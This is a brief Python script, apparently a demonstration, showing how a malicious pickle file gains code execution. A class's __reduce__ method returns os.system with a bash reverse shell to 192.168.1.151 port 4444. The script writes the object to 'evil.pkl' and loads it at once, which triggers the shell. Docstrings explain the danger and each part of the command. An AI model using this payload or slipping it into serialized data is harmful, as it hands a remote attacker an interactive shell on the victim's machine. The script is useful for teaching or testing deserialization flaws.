import pickle as pk
import os


# Save data as a pickle
def saveData(data, fileName):
    with open(fileName, 'wb') as file:
        pk.dump(data, file)


# Load data pickled data
def loadFile(fileName):
    with open(fileName, 'rb') as file:
        data = pk.load(file)
    print(f'Loading: {fileName}')



"""
    Saving data as serialized pickle files allows code to be hidden
    in the file and executed when the file is loaded.

    ***** This is a massive security rick *****
"""


class MaliciousCode:
    def __reduce__(self):
        """
            bash -i
                start a new interactive shell

            >& /dev/tcp/192.168.1.151/4444
                Redirect output over TCP connection to my address

            0>&1
                Redirect input (0) to where the output (1) is pointing
        """
        cmd = (
            "bash -c 'bash -i >& /dev/tcp/192.168.1.151/4444 0>&1;'"
        )
        return os.system, (cmd,)


fileName = 'evil.pkl'
evil = MaliciousCode()
print(f'Evil Code: {evil}')
saveData(evil, fileName)
loadFile(fileName)
